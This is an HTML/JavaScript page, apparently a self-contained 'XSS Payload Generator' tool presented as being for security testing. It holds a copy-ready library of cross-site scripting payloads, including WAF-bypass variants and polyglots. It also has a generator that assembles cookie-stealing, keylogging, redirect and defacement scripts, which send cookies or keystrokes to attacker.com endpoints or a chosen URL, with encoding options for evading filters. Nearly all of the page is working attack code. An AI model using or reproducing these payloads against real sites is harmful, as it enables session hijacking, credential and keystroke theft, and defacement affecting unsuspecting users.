<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XSS Payload Generator</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
            min-height: 100vh;
            color: #e4e4e4;
            padding: 20px;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        
        header {
            text-align: center;
            padding: 30px 0;
            border-bottom: 1px solid rgba(255,255,255,0.1);
            margin-bottom: 30px;
        }
        
        h1 {
            font-size: 2.5rem;
            background: linear-gradient(90deg, #e94560, #ff6b6b);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 10px;
        }
        
        .subtitle {
            color: #888;
            font-size: 1rem;
        }
        
        .grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
        }
        
        @media (max-width: 900px) {
            .grid { grid-template-columns: 1fr; }
        }
        
        .card {
            background: rgba(255,255,255,0.05);
            border-radius: 15px;
            padding: 25px;
            border: 1px solid rgba(255,255,255,0.1);
        }
        
        .card h2 {
            color: #e94560;
            margin-bottom: 20px;
            font-size: 1.3rem;
        }
        
        .form-group {
            margin-bottom: 15px;
        }
        
        label {
            display: block;
            margin-bottom: 5px;
            color: #aaa;
            font-size: 0.9rem;
        }
        
        input, select, textarea {
            width: 100%;
            padding: 12px;
            background: rgba(0,0,0,0.3);
            border: 1px solid rgba(255,255,255,0.1);
            border-radius: 8px;
            color: #fff;
            font-size: 0.95rem;
        }
        
        input:focus, select:focus, textarea:focus {
            outline: none;
            border-color: #e94560;
        }
        
        button {
            background: linear-gradient(90deg, #e94560, #ff6b6b);
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 1rem;
            transition: transform 0.2s, box-shadow 0.2s;
        }
        
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(233, 69, 96, 0.4);
        }
        
        .btn-secondary {
            background: rgba(255,255,255,0.1);
            margin-left: 10px;
        }
        
        .payload-list {
            max-height: 400px;
            overflow-y: auto;
        }
        
        .payload-item {
            background: rgba(0,0,0,0.3);
            padding: 15px;
            border-radius: 8px;
            margin-bottom: 10px;
            border-left: 3px solid #e94560;
        }
        
        .payload-item code {
            display: block;
            font-family: 'Courier New', monospace;
            font-size: 0.85rem;
            word-break: break-all;
            color: #4ade80;
            margin-bottom: 10px;
        }
        
        .payload-meta {
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .tag {
            display: inline-block;
            padding: 3px 8px;
            border-radius: 4px;
            font-size: 0.75rem;
            margin-right: 5px;
        }
        
        .tag-basic { background: #3b82f6; }
        .tag-advanced { background: #f59e0b; }
        .tag-bypass { background: #ef4444; }
        .tag-polyglot { background: #8b5cf6; }
        
        .copy-btn {
            background: rgba(255,255,255,0.1);
            padding: 5px 10px;
            font-size: 0.8rem;
        }
        
        .stats {
            display: flex;
            gap: 20px;
            margin-bottom: 20px;
        }
        
        .stat {
            background: rgba(0,0,0,0.3);
            padding: 15px 20px;
            border-radius: 8px;
            flex: 1;
            text-align: center;
        }
        
        .stat-value {
            font-size: 1.8rem;
            font-weight: bold;
            color: #e94560;
        }
        
        .stat-label {
            font-size: 0.8rem;
            color: #888;
        }
        
        #output {
            background: rgba(0,0,0,0.4);
            padding: 20px;
            border-radius: 8px;
            font-family: 'Courier New', monospace;
            min-height: 200px;
            white-space: pre-wrap;
            word-break: break-all;
            color: #4ade80;
        }
        
        .checkbox-group {
            display: flex;
            flex-wrap: wrap;
            gap: 15px;
        }
        
        .checkbox-item {
            display: flex;
            align-items: center;
            gap: 5px;
        }
        
        .checkbox-item input[type="checkbox"] {
            width: auto;
        }
        
        .notification {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #4ade80;
            color: #000;
            padding: 15px 25px;
            border-radius: 8px;
            transform: translateX(200%);
            transition: transform 0.3s;
        }
        
        .notification.show {
            transform: translateX(0);
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>XSS Payload Generator</h1>
            <p class="subtitle">Generate and customize XSS payloads for security testing</p>
        </header>
        
        <div class="stats">
            <div class="stat">
                <div class="stat-value" id="totalPayloads">0</div>
                <div class="stat-label">Total Payloads</div>
            </div>
            <div class="stat">
                <div class="stat-value" id="categories">6</div>
                <div class="stat-label">Categories</div>
            </div>
            <div class="stat">
                <div class="stat-value" id="bypassTechniques">15</div>
                <div class="stat-label">Bypass Techniques</div>
            </div>
        </div>
        
        <div class="grid">
            <div class="card">
                <h2>Generate Custom Payload</h2>
                
                <div class="form-group">
                    <label>Payload Type</label>
                    <select id="payloadType">
                        <option value="alert">Alert Box</option>
                        <option value="cookie">Cookie Stealer</option>
                        <option value="keylogger">Keylogger</option>
                        <option value="redirect">Redirect</option>
                        <option value="defacement">Page Defacement</option>
                        <option value="custom">Custom Script</option>
                    </select>
                </div>
                
                <div class="form-group">
                    <label>Vector</label>
                    <select id="vector">
                        <option value="script">Script Tag</option>
                        <option value="img">IMG Tag</option>
                        <option value="svg">SVG Tag</option>
                        <option value="body">Body Tag</option>
                        <option value="input">Input Tag</option>
                        <option value="iframe">IFrame Tag</option>
                        <option value="event">Event Handler</option>
                        <option value="javascript">JavaScript URI</option>
                    </select>
                </div>
                
                <div class="form-group">
                    <label>Event Handler (if applicable)</label>
                    <select id="eventHandler">
                        <option value="onerror">onerror</option>
                        <option value="onload">onload</option>
                        <option value="onclick">onclick</option>
                        <option value="onmouseover">onmouseover</option>
                        <option value="onfocus">onfocus</option>
                        <option value="onanimationend">onanimationend</option>
                    </select>
                </div>
                
                <div class="form-group">
                    <label>Custom URL/Script (optional)</label>
                    <input type="text" id="customValue" placeholder="https://attacker.com/capture.php">
                </div>
                
                <div class="form-group">
                    <label>Bypass Techniques</label>
                    <div class="checkbox-group">
                        <label class="checkbox-item">
                            <input type="checkbox" id="bypass-case"> Case Variation
                        </label>
                        <label class="checkbox-item">
                            <input type="checkbox" id="bypass-encode"> URL Encode
                        </label>
                        <label class="checkbox-item">
                            <input type="checkbox" id="bypass-html"> HTML Entities
                        </label>
                        <label class="checkbox-item">
                            <input type="checkbox" id="bypass-unicode"> Unicode
                        </label>
                        <label class="checkbox-item">
                            <input type="checkbox" id="bypass-null"> Null Bytes
                        </label>
                        <label class="checkbox-item">
                            <input type="checkbox" id="bypass-newline"> Newlines
                        </label>
                    </div>
                </div>
                
                <button onclick="generatePayload()">Generate Payload</button>
                <button class="btn-secondary" onclick="copyOutput()">Copy</button>
                
                <div class="form-group" style="margin-top: 20px;">
                    <label>Generated Payload</label>
                    <div id="output"></div>
                </div>
            </div>
            
            <div class="card">
                <h2>Payload Library</h2>
                <div class="form-group">
                    <label>Filter by Category</label>
                    <select id="filterCategory" onchange="filterPayloads()">
                        <option value="all">All Categories</option>
                        <option value="basic">Basic</option>
                        <option value="advanced">Advanced</option>
                        <option value="bypass">WAF Bypass</option>
                        <option value="polyglot">Polyglot</option>
                    </select>
                </div>
                
                <div class="payload-list" id="payloadList"></div>
            </div>
        </div>
    </div>
    
    <div class="notification" id="notification">Copied to clipboard!</div>
    
    <script>
        // XSS Payload Library
        const payloads = [
            // Basic Payloads
            { code: '<script>alert(1)</script>', category: 'basic', tags: ['basic'] },
            { code: '<script>alert(document.domain)</script>', category: 'basic', tags: ['basic'] },
            { code: '<img src=x onerror=alert(1)>', category: 'basic', tags: ['basic'] },
            { code: '<svg onload=alert(1)>', category: 'basic', tags: ['basic'] },
            { code: '<body onload=alert(1)>', category: 'basic', tags: ['basic'] },
            { code: '<input onfocus=alert(1) autofocus>', category: 'basic', tags: ['basic'] },
            { code: '<marquee onstart=alert(1)>', category: 'basic', tags: ['basic'] },
            { code: '<video src=x onerror=alert(1)>', category: 'basic', tags: ['basic'] },
            
            // Advanced Payloads
            { code: '<script>fetch("https://attacker.com?c="+document.cookie)</script>', category: 'advanced', tags: ['advanced'] },
            { code: '<img src=x onerror="eval(atob(\'YWxlcnQoMSk=\'))">', category: 'advanced', tags: ['advanced'] },
            { code: '<svg/onload=alert(String.fromCharCode(88,83,83))>', category: 'advanced', tags: ['advanced'] },
            { code: '<iframe srcdoc="<script>alert(1)</script>">', category: 'advanced', tags: ['advanced'] },
            { code: '<object data="javascript:alert(1)">', category: 'advanced', tags: ['advanced'] },
            { code: '<details open ontoggle=alert(1)>', category: 'advanced', tags: ['advanced'] },
            { code: '<math><maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(1)">CLICKME</maction></math>', category: 'advanced', tags: ['advanced'] },
            
            // WAF Bypass Payloads
            { code: '<ScRiPt>alert(1)</ScRiPt>', category: 'bypass', tags: ['bypass'] },
            { code: '<scr<script>ipt>alert(1)</scr</script>ipt>', category: 'bypass', tags: ['bypass'] },
            { code: '<img src=x onerror=\\u0061lert(1)>', category: 'bypass', tags: ['bypass'] },
            { code: '"><img src=x onerror=alert(1)>//', category: 'bypass', tags: ['bypass'] },
            { code: '<svg/onload=alert`1`>', category: 'bypass', tags: ['bypass'] },
            { code: '<svg onload=alert&lpar;1&rpar;>', category: 'bypass', tags: ['bypass'] },
            { code: '<img src=x onerror="&#97;lert(1)">', category: 'bypass', tags: ['bypass'] },
            { code: '<!--<script>-->alert(1)<!--</script>-->', category: 'bypass', tags: ['bypass'] },
            { code: '<img src="x`y" onerror=alert(1)>', category: 'bypass', tags: ['bypass'] },
            { code: '<a href="ja&#x09;vascript:alert(1)">click</a>', category: 'bypass', tags: ['bypass'] },
            
            // Polyglot Payloads
            { code: 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcLiCk=alert() )//%%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e', category: 'polyglot', tags: ['polyglot'] },
            { code: '"><img src=x onerror=alert(1)//"><svg onload=alert(1)//"><script>alert(1)</script>', category: 'polyglot', tags: ['polyglot'] },
            { code: '\'"--></style></script><script>alert(1)</script>', category: 'polyglot', tags: ['polyglot'] },
        ];
        
        function initPayloadList() {
            document.getElementById('totalPayloads').textContent = payloads.length;
            filterPayloads();
        }
        
        function filterPayloads() {
            const filter = document.getElementById('filterCategory').value;
            const container = document.getElementById('payloadList');
            container.innerHTML = '';
            
            const filtered = filter === 'all' ? payloads : payloads.filter(p => p.category === filter);
            
            filtered.forEach((payload, index) => {
                const div = document.createElement('div');
                div.className = 'payload-item';
                div.innerHTML = `
                    <code>${escapeHtml(payload.code)}</code>
                    <div class="payload-meta">
                        <div>
                            ${payload.tags.map(t => `<span class="tag tag-${t}">${t}</span>`).join('')}
                        </div>
                        <button class="copy-btn" onclick="copyPayload(${index})">Copy</button>
                    </div>
                `;
                container.appendChild(div);
            });
        }
        
        function generatePayload() {
            const type = document.getElementById('payloadType').value;
            const vector = document.getElementById('vector').value;
            const event = document.getElementById('eventHandler').value;
            const custom = document.getElementById('customValue').value;
            
            let script = '';
            switch (type) {
                case 'alert':
                    script = 'alert(document.domain)';
                    break;
                case 'cookie':
                    const url = custom || 'https://attacker.com/steal.php';
                    script = `fetch('${url}?c='+document.cookie)`;
                    break;
                case 'keylogger':
                    script = `document.onkeypress=function(e){fetch('${custom||'https://attacker.com/log.php'}?k='+e.key)}`;
                    break;
                case 'redirect':
                    script = `location='${custom||'https://attacker.com'}'`;
                    break;
                case 'defacement':
                    script = `document.body.innerHTML='<h1>Hacked</h1>'`;
                    break;
                case 'custom':
                    script = custom || 'alert(1)';
                    break;
            }
            
            let payload = '';
            switch (vector) {
                case 'script':
                    payload = `<script>${script}</script>`;
                    break;
                case 'img':
                    payload = `<img src=x ${event}=${script}>`;
                    break;
                case 'svg':
                    payload = `<svg ${event}=${script}>`;
                    break;
                case 'body':
                    payload = `<body ${event}=${script}>`;
                    break;
                case 'input':
                    payload = `<input ${event}=${script} autofocus>`;
                    break;
                case 'iframe':
                    payload = `<iframe srcdoc="<script>${script}</script>">`;
                    break;
                case 'event':
                    payload = `" ${event}="${script}"`;
                    break;
                case 'javascript':
                    payload = `javascript:${script}`;
                    break;
            }
            
            // Apply bypass techniques
            if (document.getElementById('bypass-case').checked) {
                payload = randomCase(payload);
            }
            if (document.getElementById('bypass-encode').checked) {
                payload = encodeURIComponent(payload);
            }
            if (document.getElementById('bypass-html').checked) {
                payload = htmlEncode(payload);
            }
            if (document.getElementById('bypass-unicode').checked) {
                payload = payload.replace(/a/g, '\\u0061').replace(/e/g, '\\u0065');
            }
            
            document.getElementById('output').textContent = payload;
        }
        
        function randomCase(str) {
            return str.split('').map(c => Math.random() > 0.5 ? c.toUpperCase() : c.toLowerCase()).join('');
        }
        
        function htmlEncode(str) {
            return str.replace(/a/g, '&#97;').replace(/e/g, '&#101;').replace(/l/g, '&#108;');
        }
        
        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }
        
        function copyPayload(index) {
            navigator.clipboard.writeText(payloads[index].code);
            showNotification();
        }
        
        function copyOutput() {
            const output = document.getElementById('output').textContent;
            navigator.clipboard.writeText(output);
            showNotification();
        }
        
        function showNotification() {
            const notif = document.getElementById('notification');
            notif.classList.add('show');
            setTimeout(() => notif.classList.remove('show'), 2000);
        }
        
        // Initialize
        initPayloadList();
    </script>
</body>
</html>
